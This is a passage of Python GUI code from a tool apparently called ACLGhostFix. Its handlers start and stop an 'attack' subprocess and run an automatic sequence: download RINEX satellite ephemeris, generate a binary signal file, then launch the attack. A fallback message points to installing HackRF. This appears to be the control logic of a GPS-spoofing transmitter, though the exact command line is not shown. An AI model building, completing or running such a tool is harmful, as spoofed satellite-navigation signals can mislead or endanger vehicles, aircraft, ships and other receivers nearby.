        self.b_atk.configure(state="disabled")
        self.b_stop.configure(state="normal")
        self.attacking = True
        try:
            self.attack_proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, shell=False)
            cnt=0
            for line in self.attack_proc.stdout:
                l=line.strip()
                if l:
                    cnt+=1
                    if cnt%4==0: self._log(f"  📡 {l}", C["neon"])
                if not self.attacking: break
            self.attack_proc.wait()
        except FileNotFoundError:
            self._log(t("log_hackrf_tr_no", self.lang), C["red"])
            self._log("   → github.com/greatscottgadgets/hackrf  (install via the official HackRF release/installer)", C["gray"])
        except Exception as e:
            self._log(f"✗  {e}", C["red"])
        finally:
            self.attacking=False
            self.b_atk.configure(state="normal")
            self.b_stop.configure(state="disabled")
            self._status(t("status_stopped", self.lang), C["yellow"])
            self._log(t("log_atk_done", self.lang), C["yellow"])

    def _stop(self):
        self.attacking=False
        if self.attack_proc:
            try: self.attack_proc.terminate()
            except: pass
        self._log(t("log_atk_stopped", self.lang), C["yellow"])
        self._status(t("status_stopped", self.lang), C["yellow"])
        self.b_atk.configure(state="normal")
        self.b_stop.configure(state="disabled")

    def _auto(self):
        threading.Thread(target=self._auto_seq, daemon=True).start()

    def _auto_seq(self):
        self._log("═"*42, C["neon"])
        self._log(t("log_auto_start", self.lang), C["yellow"])
        self._log("═"*42, C["neon"])
        self._dl_rinex(); time.sleep(0.5)
        if not self.rinex_file:
            self._log(t("log_auto_no_rinex", self.lang), C["red"]); return
        self._gen_bin(); time.sleep(0.5)
        if not self.bin_file or not os.path.exists(str(self.bin_file)):
            self._log(t("log_auto_no_bin", self.lang), C["red"]); return
        self._attack()


if __name__ == "__main__":
    app = ACLGhostFix()
    app.mainloop()
